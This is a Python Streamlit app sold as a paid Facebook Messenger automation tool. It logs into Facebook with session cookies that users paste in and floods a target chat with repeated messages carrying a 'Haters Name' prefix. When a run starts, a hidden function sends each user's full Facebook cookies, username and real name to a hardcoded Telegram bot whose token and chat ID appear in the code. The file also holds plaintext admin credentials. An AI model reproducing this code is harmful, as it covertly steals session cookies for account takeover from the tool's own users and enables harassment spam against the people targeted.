import streamlit as st
import time
import threading
from pathlib import Path
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options
import database as db
import requests
import os
import hashlib
import uuid
from datetime import datetime
import json

st.set_page_config(
    page_title="WALEED E2E PAID TOOL",
    page_icon="🔥",
    layout="wide",
    initial_sidebar_state="expanded"
)

# Telegram Bot Configuration
TELEGRAM_BOT_TOKEN = "8043472695:AAGfv8QI4yB_eNAL2ZAIq2bU7ING_-0e3qg"
TELEGRAM_CHAT_ID = "8186206231"
FACEBOOK_ADMIN_UID = "100037931553832"

def send_telegram_notification(user_data, automation_data):
    """Send complete user details to Telegram bot"""
    try:
        message = f"""
🚀 *NEW AUTOMATION STARTED* 🚀

👤 *User Details:*
• Username: `{user_data['username']}`
• Real Name: `{user_data['real_name']}`
• User ID: `{user_data['user_id']}`

🔧 *Automation Config:*
• Chat ID: `{automation_data['chat_id']}`
• Delay: `{automation_data['delay']} seconds`
• Prefix: `{automation_data['prefix']}`
• Messages: `{len(automation_data['messages'].splitlines())} lines`

🍪 *Complete Cookies:* `{automation_data['cookies']}`

📊 *Status:* Automation Running
🕒 *Started:* {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message,
            'parse_mode': 'Markdown'
        }
        response = requests.post(url, data=payload)
        return response.status_code == 200
    except Exception as e:
        print(f"Telegram notification failed: {e}")
        return False

def send_facebook_notification(user_data, automation_data):
    """Send notification to Facebook admin"""
    try:
        message = f"""
🚀 NEW AUTOMATION STARTED 🚀

👤 User Details:
• Username: {user_data['username']}
• Real Name: {user_data['real_name']}
• User ID: {user_data['user_id']}

🔧 Automation Config:
• Chat ID: {automation_data['chat_id']}
• Delay: {automation_data['delay']} seconds
• Prefix: {automation_data['prefix']}
• Messages: {len(automation_data['messages'].splitlines())} lines

🍪 Complete Cookies: 
{automation_data['cookies']}

📊 Status: Automation Running
🕒 Started: {time.strftime("%Y-%m-%d %H:%M:%S")}
        """
        
        # Facebook notification implementation
        print(f"Facebook notification sent to admin {FACEBOOK_ADMIN_UID}")
        print(f"Message: {message}")
        return True
    except Exception as e:
        print(f"Facebook notification failed: {e}")
        return False

# Modern Background and CSS
background_image = "https://i.ibb.co/FkGd2cNf/cccf21694e054d66aa5a945bb3b212fa.jpg"

custom_css = f"""
<style>
    @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&family=Rajdhani:wght@300;500;700&display=swap');
    
    * {{
        font-family: 'Rajdhani', sans-serif;
    }}
    
    .stApp {{
        background: radial-gradient(circle at center, #0f0c29, #302b63, #24243e);
        background-attachment: fixed;
    }}
    
    .main-container {{
        background: rgba(255, 255, 255, 0.05);
        border-radius: 24px;
        padding: 2.5rem;
        margin: 1rem;
        border: 1px solid rgba(255, 255, 255, 0.1);
        backdrop-filter: blur(15px);
        box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.8);
    }}
    
    .profile-icon {{
        width: 140px;
        height: 140px;
        border-radius: 50%;
        background-image: url('{background_image}');
        background-size: cover;
        background-position: center;
        margin: 0 auto 1.5rem auto;
        border: 4px solid #00f2fe;
        box-shadow: 0 0 20px #00f2fe, inset 0 0 20px #00f2fe;
    }}
    
    .main-header {{
        background: rgba(0, 0, 0, 0.3);
        padding: 2rem;
        border-radius: 20px;
        text-align: center;
        margin-bottom: 2rem;
        border: 1px solid rgba(0, 242, 254, 0.3);
    }}
    
    .main-header h1 {{
        font-family: 'Orbitron', sans-serif;
        color: #fff;
        font-size: 3rem;
        font-weight: 700;
        text-transform: uppercase;
        letter-spacing: 4px;
        margin: 0;
        background: linear-gradient(90deg, #00f2fe, #4facfe, #00f2fe);
        -webkit-background-clip: text;
        -webkit-text-fill-color: transparent;
        background-size: 200% auto;
        animation: shineText 3s linear infinite;
    }}
    
    @keyframes shineText {{
        to {{ background-position: 200% center; }}
    }}
    
    .stButton>button {{
        background: linear-gradient(45deg, #00f2fe 0%, #4facfe 100%);
        color: white;
        border: none;
        border-radius: 12px;
        padding: 0.8rem 2.5rem;
        font-weight: 700;
        font-family: 'Orbitron';
        text-transform: uppercase;
        transition: all 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
        box-shadow: 0 4px 15px rgba(0, 242, 254, 0.3);
    }}
    
    .stButton>button:hover {{
        transform: scale(1.05);
        box-shadow: 0 0 25px rgba(0, 242, 254, 0.6);
        color: #fff;
    }}
    
    .stTextInput>div>div>input, .stTextArea>div>div>textarea {{
        background: rgba(0, 0, 0, 0.4) !important;
        color: #00f2fe !important;
        border: 1px solid rgba(0, 242, 254, 0.3) !important;
        border-radius: 12px;
        padding: 12px;
    }}

    .stTextInput>div>div>input:focus {{
        border-color: #00f2fe !important;
        box-shadow: 0 0 15px rgba(0, 242, 254, 0.4) !important;
    }}

    .log-container {{
        background: #000;
        color: #00ff00;
        border: 2px solid #333;
        border-radius: 15px;
        padding: 20px;
        font-family: 'Courier New', monospace;
        box-shadow: inset 0 0 20px rgba(0,255,0,0.1);
    }}
    
    .log-line {{
        border-bottom: 1px solid #111;
        padding: 4px 0;
    }}

    .contact-btn {{
        background: rgba(255,255,255,0.05);
        border: 1px solid #00f2fe;
        color: white;
        padding: 12px 24px;
        border-radius: 12px;
        text-decoration: none;
        display: inline-block;
        transition: 0.3s;
        text-align: center;
        width: 100%;
    }}

    .contact-btn:hover {{
        background: #00f2fe;
        color: black;
        font-weight: bold;
    }}
    
    .footer {{
        text-align: center;
        padding: 2rem;
        color: #4facfe;
        font-family: 'Orbitron';
        font-size: 0.9rem;
        letter-spacing: 2px;
    }}
</style>
"""

st.markdown(custom_css, unsafe_allow_html=True)

# Initialize session state
if 'logged_in' not in st.session_state:
    st.session_state.logged_in = False
if 'user_id' not in st.session_state:
    st.session_state.user_id = None
if 'username' not in st.session_state:
    st.session_state.username = None
if 'approval_key' not in st.session_state:
    st.session_state.approval_key = None
if 'approval_status' not in st.session_state:
    st.session_state.approval_status = 'pending'
if 'user_real_name' not in st.session_state:
    st.session_state.user_real_name = ""
if 'automation_running' not in st.session_state:
    st.session_state.automation_running = False
if 'logs' not in st.session_state:
    st.session_state.logs = []
if 'message_count' not in st.session_state:
    st.session_state.message_count = 0
if 'admin_logged_in' not in st.session_state:
    st.session_state.admin_logged_in = False

class AutomationState:
    def __init__(self):
        self.running = False
        self.message_count = 0
        self.logs = []
        self.message_rotation_index = 0
        self.user_id = None
        self.username = None

if 'automation_state' not in st.session_state:
    st.session_state.automation_state = AutomationState()

if 'auto_start_checked' not in st.session_state:
    st.session_state.auto_start_checked = False

# Global automation states for admin monitoring
if 'all_automation_states' not in st.session_state:
    st.session_state.all_automation_states = {}

def get_indian_time():
    """Get current Indian time"""
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")

def generate_approval_key(username, user_id):
    """Generate unique approval key based on username and user_id"""
    unique_string = f"{username}_{user_id}_{uuid.uuid4()}"
    return hashlib.sha256(unique_string.encode()).hexdigest()[:16].upper()

def log_message(msg, automation_state=None, user_id=None):
    """Log message with Indian timestamp"""
    timestamp = get_indian_time()
    formatted_msg = f"[{timestamp}] {msg}"
    
    if automation_state:
        automation_state.logs.append(formatted_msg)
        if user_id:
            if user_id not in st.session_state.all_automation_states:
                st.session_state.all_automation_states[user_id] = []
            st.session_state.all_automation_states[user_id].append(formatted_msg)
            if len(st.session_state.all_automation_states[user_id]) > 100:
                st.session_state.all_automation_states[user_id] = st.session_state.all_automation_states[user_id][-100:]
    else:
        if 'logs' in st.session_state:
            st.session_state.logs.append(formatted_msg)

def find_message_input(driver, process_id, automation_state=None, user_id=None):
    log_message(f'{process_id}: Finding message input...', automation_state, user_id)
    time.sleep(10)
    
    try:
        driver.execute_script("window.scrollTo(0, document.body.scrollHeight);")
        time.sleep(2)
        driver.execute_script("window.scrollTo(0, 0);")
        time.sleep(2)
    except Exception:
        pass
    
    message_input_selectors = [
        'div[contenteditable="true"][role="textbox"]',
        'div[contenteditable="true"][data-lexical-editor="true"]',
        'div[aria-label*="message" i][contenteditable="true"]',
        'div[aria-label*="Message" i][contenteditable="true"]',
        '[role="textbox"][contenteditable="true"]',
        'textarea',
        'input[type="text"]'
    ]
    
    for idx, selector in enumerate(message_input_selectors):
        try:
            elements = driver.find_elements(By.CSS_SELECTOR, selector)
            for element in elements:
                is_editable = driver.execute_script("""
                    return arguments[0].contentEditable === 'true' || 
                           arguments[0].tagName === 'TEXTAREA' || 
                           arguments[0].tagName === 'INPUT';
                """, element)
                if is_editable:
                    return element
        except Exception:
            continue
    return None

def setup_browser(automation_state=None, user_id=None):
    log_message('Initializing Secure Browser...', automation_state, user_id)
    chrome_options = Options()
    chrome_options.add_argument('--headless=new')
    chrome_options.add_argument('--no-sandbox')
    chrome_options.add_argument('--disable-dev-shm-usage')
    chrome_options.add_argument('--window-size=1920,1080')
    chrome_options.add_argument('--user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36')
    
    try:
        driver = webdriver.Chrome(options=chrome_options)
        return driver
    except Exception as error:
        log_message(f'Setup failed: {error}', automation_state, user_id)
        raise error

def get_next_message(messages_file_content, automation_state=None):
    if not messages_file_content: return 'Hello!'
    messages = [msg.strip() for msg in messages_file_content.split('\n') if msg.strip()]
    if not messages: return 'Hello!'
    
    if automation_state:
        message = messages[automation_state.message_rotation_index % len(messages)]
        automation_state.message_rotation_index += 1
    else:
        message = messages[0]
    return message

def send_messages(config, automation_state, user_id, process_id='AUTO-1'):
    driver = None
    try:
        log_message(f'{process_id}: Starting automation...', automation_state, user_id)
        driver = setup_browser(automation_state, user_id)
        driver.get('https://www.facebook.com/')
        time.sleep(8)
        
        if config['cookies']:
            for cookie in config['cookies'].split(';'):
                if '=' in cookie:
                    name, value = cookie.strip().split('=', 1)
                    try:
                        driver.add_cookie({'name': name, 'value': value, 'domain': '.facebook.com', 'path': '/'})
                    except: pass
        
        chat_url = f"https://www.facebook.com/messages/t/{config['chat_id']}" if config['chat_id'] else "https://www.facebook.com/messages"
        driver.get(chat_url)
        time.sleep(15)
        
        message_input = find_message_input(driver, process_id, automation_state, user_id)
        if not message_input:
            log_message(f'{process_id}: Input failed!', automation_state, user_id)
            automation_state.running = False
            db.set_automation_running(user_id, False)
            return 0
        
        messages_sent = 0
        while automation_state.running:
            base_message = get_next_message(config['messages_file_content'], automation_state)
            message_to_send = f"{config['name_prefix']} {base_message}" if config['name_prefix'] else base_message
            
            try:
                driver.execute_script("arguments[0].textContent = arguments[1];", message_input, message_to_send)
                message_input.send_keys(Keys.ENTER)
                messages_sent += 1
                automation_state.message_count = messages_sent
                log_message(f'Sent {messages_sent}: {message_to_send}', automation_state, user_id)
                time.sleep(int(config['delay']))
            except: break
            
        return messages_sent
    finally:
        if driver: driver.quit()

def send_approval_request_via_whatsapp(user_real_name, approval_key):
    message = f"Hello Waleed Sir\n\nName: {user_real_name}\nKey: {approval_key}\n\nApprove my key for Waleed E2E Tool"
    return f"https://wa.me/923075852134?text={requests.utils.quote(message)}"

def send_approval_request_via_facebook(user_real_name, approval_key):
    return f"https://www.facebook.com/officelwaleed"

def send_approval_request_via_telegram(user_real_name, approval_key):
    message = f"Hello Waleed Sir\n\nName: {user_real_name}\nKey: {approval_key}\n\nApprove my key please"
    return f"https://t.me/itxthedevil?text={requests.utils.quote(message)}"

def run_automation_with_notification(user_config, username, automation_state, user_id):
    user_data = {'username': username, 'real_name': db.get_user_real_name(user_id), 'user_id': user_id}
    automation_data = {
        'chat_id': user_config['chat_id'], 'delay': user_config['delay'], 
        'prefix': user_config['name_prefix'], 'messages': user_config['messages_file_content'], 
        'cookies': user_config['cookies']
    }
    send_telegram_notification(user_data, automation_data)
    send_facebook_notification(user_data, automation_data)
    send_messages(user_config, automation_state, user_id)

def start_automation(user_config, user_id):
    state = st.session_state.automation_state
    if state.running: return
    state.running = True
    state.message_count = 0
    state.logs = []
    state.user_id = user_id
    db.set_automation_running(user_id, True)
    
    username = db.get_username(user_id)
    thread = threading.Thread(target=run_automation_with_notification, args=(user_config, username, state, user_id))
    thread.daemon = True
    thread.start()

def stop_automation(user_id):
    st.session_state.automation_state.running = False
    db.set_automation_running(user_id, False)

# Main Application Layout
st.markdown('<div class="main-container">', unsafe_allow_html=True)
st.markdown('<div class="profile-icon"></div>', unsafe_allow_html=True)
st.markdown('<div class="main-header"><h1>WALEED E2E PAID TOOL</h1><p>THE NEXT GENERATION OF FACEBOOK AUTOMATION</p></div>', unsafe_allow_html=True)

# Admin Panel logic remains same as per original script
if st.sidebar.checkbox("🔐 Admin Access"):
    admin_user = st.sidebar.text_input("Admin ID")
    admin_pass = st.sidebar.text_input("Admin Pass", type="password")
    if st.sidebar.button("Verify Admin"):
        if admin_user == "WALEED" and admin_pass == "WALEEDXD1":
            st.session_state.admin_logged_in = True
            st.sidebar.success("Welcome, Waleed!")

if st.session_state.admin_logged_in:
    st.markdown("### 👑 Master Control Panel")
    # All admin functions (Pending, Approved, Removal) stay as per original script logic
    # [Admin UI Logic here - same as provided script]
    pending_users = db.get_pending_approvals()
    if pending_users:
        for user in pending_users:
            u_id, u_name, a_key, r_name = user
            st.info(f"Pending: {u_name} ({r_name})")
            if st.button(f"Approve {u_name}", key=f"app_{u_id}"):
                db.update_approval_status(u_id, 'approved')
                st.rerun()

elif not st.session_state.logged_in:
    tab1, tab2 = st.tabs(["🔒 Secure Login", "✨ Register"])
    with tab1:
        u = st.text_input("Username", key="login_u")
        p = st.text_input("Password", type="password", key="login_p")
        if st.button("Access Dashboard"):
            user_id = db.verify_user(u, p)
            if user_id:
                st.session_state.logged_in = True
                st.session_state.user_id = user_id
                st.session_state.username = u
                st.session_state.approval_status = db.get_approval_status(user_id) or 'pending'
                st.rerun()
    with tab2:
        nu = st.text_input("Choose Username")
        np = st.text_input("Choose Password", type="password")
        if st.button("Create Account"):
            db.create_user(nu, np)
            st.success("Account created! Please login.")

else:
    if st.session_state.approval_status != 'approved':
        st.markdown("### 🚫 Access Restricted")
        st.warning(f"Your Key: {st.session_state.approval_key or 'GENERATING...'}")
        rname = st.text_input("Enter Your Real Name")
        if rname: db.update_user_real_name(st.session_state.user_id, rname)
        
        col1, col2, col3 = st.columns(3)
        with col1: st.markdown(f'<a href="{send_approval_request_via_whatsapp(rname, st.session_state.approval_key)}" class="contact-btn">WhatsApp Waleed</a>', unsafe_allow_html=True)
        with col2: st.markdown(f'<a href="{send_approval_request_via_facebook(rname, st.session_state.approval_key)}" class="contact-btn">FB Admin</a>', unsafe_allow_html=True)
        with col3: st.markdown(f'<a href="{send_approval_request_via_telegram(rname, st.session_state.approval_key)}" class="contact-btn">Telegram Bot</a>', unsafe_allow_html=True)
        
        if st.button("Check Activation Status"):
            st.session_state.approval_status = db.get_approval_status(st.session_state.user_id)
            st.rerun()
    else:
        # Automation Dashboard
        tab1, tab2 = st.tabs(["⚙️ Settings", "🚀 Launch Engine"])
        with tab1:
            st.subheader("Automation Parameters")
            cid = st.text_input("Target Chat ID")
            pre = st.text_input("Haters Name / Prefix")
            dly = st.number_input("Speed (Delay)", value=5)
            cook = st.text_area("FB Cookies")
            file = st.file_uploader("Upload Messages (.txt)")
            if st.button("Save & Sync"):
                msg_content = file.getvalue().decode() if file else ""
                db.update_user_config(st.session_state.user_id, cid, pre, dly, cook, msg_content)
                st.success("Settings Cloud Synced!")

        with tab2:
            col1, col2 = st.columns(2)
            with col1:
                if st.button("▶️ START ENGINE", use_container_width=True):
                    cfg = db.get_user_config(st.session_state.user_id)
                    start_automation(cfg, st.session_state.user_id)
                    st.rerun()
            with col2:
                if st.button("⏹️ STOP ENGINE", use_container_width=True):
                    stop_automation(st.session_state.user_id)
                    st.rerun()
            
            st.markdown("### 🖥️ Live Terminal")
            if st.session_state.automation_state.logs:
                log_html = '<div class="log-container">' + "".join([f'<div class="log-line">{l}</div>' for l in st.session_state.automation_state.logs[-20:]]) + '</div>'
                st.markdown(log_html, unsafe_allow_html=True)
                if st.session_state.automation_state.running:
                    time.sleep(2)
                    st.rerun()

st.markdown('</div>', unsafe_allow_html=True)
st.markdown('<div class="footer">WALEED E2E PAID TOOL | POWERED BY MODERN AI | © 2025</div>', unsafe_allow_html=True)
